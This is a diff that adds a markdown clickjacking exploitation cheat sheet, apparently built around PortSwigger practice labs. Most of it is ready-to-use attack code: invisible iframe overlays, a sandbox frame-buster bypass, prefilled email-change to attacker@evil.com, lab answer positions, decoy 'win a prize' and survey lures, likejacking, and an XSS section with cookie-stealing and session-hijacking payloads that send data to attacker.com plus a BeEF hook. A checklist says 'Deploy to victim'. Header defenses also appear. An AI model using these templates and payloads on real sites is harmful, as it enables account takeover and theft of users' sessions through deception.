@@ -1,0 +1,378 @@
+# Clickjacking Exploitation Cheat Sheet
+
+## Quick Vulnerability Test
+
+```bash
+# Check headers
+curl -I https://target.com | grep -i "x-frame\|frame-ancestors"
+
+# Create test HTML
+echo '<iframe src="https://target.com"></iframe>' > test.html && open test.html
+```
+
+**Vulnerable if:** Page loads in iframe, no X-Frame-Options or CSP frame-ancestors headers.
+
+---
+
+## Basic Attack Templates
+
+### Template 1: Standard Overlay
+
+```html
+<style>
+    iframe { position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }
+    div { position: absolute; top: 300px; left: 60px; z-index: 1; }
+</style>
+<div>Click me</div>
+<iframe src="https://target.com/account"></iframe>
+```
+
+### Template 2: Form Prepopulation
+
+```html
+<style>
+    iframe { position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }
+    div { position: absolute; top: 400px; left: 80px; z-index: 1; }
+</style>
+<div>Click me</div>
+<iframe src="https://target.com/account?email=attacker@evil.com"></iframe>
+```
+
+### Template 3: Frame Buster Bypass
+
+```html
+<style>
+    iframe { position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }
+    div { position: absolute; top: 400px; left: 80px; z-index: 1; }
+</style>
+<div>Click me</div>
+<iframe sandbox="allow-forms" src="https://target.com/account?email=attacker@evil.com"></iframe>
+```
+
+### Template 4: Multi-Step
+
+```html
+<style>
+    iframe { position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }
+    .step1 { position: absolute; top: 330px; left: 50px; z-index: 1; }
+    .step2 { position: absolute; top: 285px; left: 225px; z-index: 1; }
+</style>
+<div class="step1">Click me first</div>
+<div class="step2">Click me next</div>
+<iframe src="https://target.com/account"></iframe>
+```
+
+### Template 5: DOM XSS Trigger
+
+```html
+<style>
+    iframe { position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }
+    div { position: absolute; top: 600px; left: 80px; z-index: 1; }
+</style>
+<div>Click me</div>
+<iframe src="https://target.com/feedback?name=<img src=x onerror=alert(1)>"></iframe>
+```
+
+---
+
+## CSS Properties Quick Reference
+
+| Property | Value | Purpose |
+|----------|-------|---------|
+| `opacity` | `0.0001` | Nearly invisible (NOT 0 - makes non-interactive) |
+| `z-index` | `2` (iframe), `1` (decoy) | Layering order (higher = on top) |
+| `position` | `relative` or `absolute` | Enables precise positioning |
+| `top` | `300px` (example) | Vertical alignment in pixels |
+| `left` | `60px` (example) | Horizontal alignment in pixels |
+| `width` | `500px` | Match target page width |
+| `height` | `700px` | Match target page height |
+
+**Alignment Process:**
+1. Set `opacity: 0.1` (semi-transparent)
+2. Hover over decoy - cursor should change to pointer
+3. Adjust `top`/`left` values until perfect
+4. Change `opacity: 0.0001` for final exploit
+
+---
+
+## Sandbox Attribute Reference
+
+```html
+<!-- Only allow forms (bypasses frame buster) -->
+<iframe sandbox="allow-forms" src="..."></iframe>
+
+<!-- Allow forms and scripts (frame buster WILL work) -->
+<iframe sandbox="allow-forms allow-scripts" src="..."></iframe>
+
+<!-- Maximum restrictions (blocks everything including forms) -->
+<iframe sandbox="" src="..."></iframe>
+```
+
+**Golden Rule:** Only use `allow-forms` to bypass frame busters while maintaining exploitation capability.
+
+---
+
+## PortSwigger Labs Quick Solutions
+
+| Lab | Target | URL Parameters | Position (top, left) |
+|-----|--------|----------------|----------------------|
+| Lab 1: Basic CSRF | Account deletion | None | 300px, 60px |
+| Lab 2: Prefilled Form | Email change | `?email=attacker@evil.com` | 400px, 80px |
+| Lab 3: Frame Buster | Email change | `?email=attacker@evil.com` + `sandbox="allow-forms"` | 400px, 80px |
+| Lab 4: DOM XSS | Submit form | `?name=<img src=x onerror=print()>` | 600px, 80px |
+| Lab 5: Multistep | Account deletion | None | Step1: 330px, 50px<br>Step2: 285px, 225px |
+
+---
+
+## Defense Headers
+
+### Secure Configuration
+
+```http
+X-Frame-Options: DENY
+Content-Security-Policy: frame-ancestors 'none';
+Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
+```
+
+### Server Configurations
+
+**Apache (.htaccess):**
+```apache
+Header always set X-Frame-Options "DENY"
+Header always set Content-Security-Policy "frame-ancestors 'none';"
+```
+
+**Nginx:**
+```nginx
+add_header X-Frame-Options "DENY" always;
+add_header Content-Security-Policy "frame-ancestors 'none';" always;
+```
+
+**Node.js:**
+```javascript
+app.use((req, res, next) => {
+    res.setHeader('X-Frame-Options', 'DENY');
+    res.setHeader('Content-Security-Policy', "frame-ancestors 'none';");
+    next();
+});
+```
+
+**PHP:**
+```php
+header("X-Frame-Options: DENY");
+header("Content-Security-Policy: frame-ancestors 'none';");
+```
+
+---
+
+## Burp Suite Clickbandit Workflow
+
+1. **Burp menu** → Burp Clickbandit
+2. **Copy** script to clipboard
+3. Open target page in **browser**
+4. Open **DevTools console** (F12)
+5. **Paste** Clickbandit script
+6. Click **"Record mode"**
+7. **Perform actions** on target page
+8. Click **"Finish"**
+9. **Review** generated exploit
+10. Click **"Save"** to export HTML
+
+---
+
+## Common Mistakes
+
+| Mistake | Issue | Fix |
+|---------|-------|-----|
+| `opacity: 0` | iframe non-interactive | Use `opacity: 0.0001` |
+| Low z-index on iframe | Can't click iframe | iframe must have higher z-index than decoy |
+| Wrong position type | Can't align elements | Use `position: relative` or `absolute` |
+| Using `allow-scripts` | Frame buster works | Only use `allow-forms` |
+| Testing opacity 0.1 | Visible in final attack | Change to 0.0001 before delivery |
+
+---
+
+## XSS Payloads for Combined Attacks
+
+```html
+<!-- Alert (testing) -->
+<img src=x onerror=alert(1)>
+
+<!-- Print function (PortSwigger Lab 4) -->
+<img src=x onerror=print()>
+
+<!-- Cookie theft -->
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+
+<!-- Session hijacking -->
+<img src=x onerror=location='https://attacker.com?s='+localStorage.session>
+
+<!-- Form auto-submit -->
+<img src=x onerror=document.forms[0].submit()>
+
+<!-- BeEF hook -->
+<script src=https://attacker.com:3000/hook.js></script>
+```
+
+---
+
+## Attack Checklist
+
+**Pre-Exploitation:**
+- [ ] Check X-Frame-Options header
+- [ ] Check CSP frame-ancestors directive
+- [ ] Test if page loads in basic iframe
+- [ ] Identify target buttons/actions
+- [ ] Note button positions (use browser inspect)
+
+**Exploitation:**
+- [ ] Create HTML with iframe + decoy
+- [ ] Set opacity: 0.1 for alignment
+- [ ] Adjust top/left until aligned
+- [ ] Test cursor changes over decoy
+- [ ] Change opacity: 0.0001
+- [ ] Test exploitation personally
+- [ ] Deploy to victim
+
+**Post-Exploitation:**
+- [ ] Document attack details
+- [ ] Calculate CVSS score
+- [ ] Recommend defenses
+- [ ] Prepare PoC video/screenshots
+
+---
+
+## Defense Checklist
+
+- [ ] X-Frame-Options: DENY header set
+- [ ] CSP frame-ancestors 'none' directive set
+- [ ] SameSite=Strict on session cookies
+- [ ] HttpOnly flag on session cookies
+- [ ] Secure flag on all cookies (HTTPS)
+- [ ] Re-authentication for critical actions
+- [ ] Confirmation dialogs for dangerous actions
+- [ ] Applied to ALL pages, not just sensitive ones
+- [ ] Tested in real iframe to verify
+- [ ] Monitored in CI/CD pipeline
+
+---
+
+## One-Liners
+
+```bash
+# Quick header check
+curl -sI https://target.com | grep -iE "x-frame-options|content-security-policy"
+
+# Python header check
+python3 -c "import requests; r=requests.get('https://target.com'); print(f\"XFO: {r.headers.get('X-Frame-Options', 'MISSING')}\nCSP: {r.headers.get('Content-Security-Policy', 'MISSING')}\")"
+
+# Create quick test file
+cat > test.html << 'EOF'
+<h1>Clickjacking Test</h1>
+<iframe src="https://target.com" width="800" height="600"></iframe>
+EOF
+
+# Test with localhost server
+python3 -m http.server 8000
+# Navigate to http://localhost:8000/test.html
+```
+
+---
+
+## Target Positioning Guide
+
+### Common Button Positions
+
+| Target | Typical Position | Notes |
+|--------|------------------|-------|
+| Account deletion | top: 280-320px, left: 50-80px | Usually mid-page left |
+| Email update | top: 380-420px, left: 70-90px | Often lower than delete |
+| Confirmation dialog | top: 250-300px, left: 200-250px | Center of modal |
+| Submit button | top: 580-620px, left: 70-90px | Bottom of forms |
+| Social media like | top: 140-180px, left: 180-220px | Varies by platform |
+
+**Always test - positions vary by site!**
+
+---
+
+## Social Engineering Enhancements
+
+### Game Interface
+```html
+<div style="text-align:center;">
+    <h2>🎮 Win a Prize!</h2>
+    <p>Click the buttons to claim your reward!</p>
+    <div class="decoy" style="padding:20px; background:#3498db; color:white; border-radius:10px; cursor:pointer; display:inline-block;">
+        🎯 CLICK HERE TO WIN!
+    </div>
+    <iframe src="..."></iframe>
+</div>
+```
+
+### Survey Pattern
+```html
+<div style="background:white; padding:20px; border-radius:5px;">
+    <h3>Quick Survey - 1 Question</h3>
+    <p><strong>Question:</strong> Do you like our website?</p>
+    <div class="decoy" style="padding:10px 20px; background:#4CAF50; color:white; border-radius:5px; cursor:pointer; display:inline-block;">
+        ✅ Yes
+    </div>
+    <iframe src="..."></iframe>
+</div>
+```
+
+---
+
+## Attack Variations
+
+**Likejacking:**
+```html
+<iframe src="https://www.facebook.com/plugins/like.php?href=https://attacker.com/malware"></iframe>
+```
+
+**Drag-and-Drop Hijacking:**
+```html
+<div id="dropzone">Drop files here</div>
+<iframe src="https://attacker.com/receiver"></iframe>
+<script>
+document.getElementById('dropzone').addEventListener('drop', function(e) {
+    e.preventDefault();
+    // Exfiltrate dropped files
+});
+</script>
+```
+
+**Mobile Tap-Jacking:**
+```html
+<style>
+    iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 9999; }
+    .decoy { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); }
+</style>
+```
+
+---
+
+## Troubleshooting
+
+| Problem | Likely Cause | Solution |
+|---------|--------------|----------|
+| Iframe blank | X-Frame-Options: DENY | Cannot bypass - attack fails |
+| Iframe redirects | Frame buster script | Use `sandbox="allow-forms"` |
+| Click not working | Wrong z-index | Increase iframe z-index |
+| Alignment off | Wrong position values | Use opacity 0.1 to debug |
+| Form not submitting | Empty sandbox | Use `sandbox="allow-forms"` |
+| Lab not solving | opacity: 0 used | Change to 0.0001 |
+
+---
+
+## Resources
+
+- **PortSwigger Labs:** https://portswigger.net/web-security/all-labs#clickjacking
+- **OWASP:** https://owasp.org/www-community/attacks/Clickjacking
+- **Burp Clickbandit:** https://portswigger.net/burp/documentation/desktop/tools/clickbandit
+- **Complete Guide:** `clickjacking-portswigger-labs-complete.md`
+- **Quickstart:** `clickjacking-quickstart.md`
+
+---
+
+**Practice:** PortSwigger Web Security Academy provides free, legal practice labs.
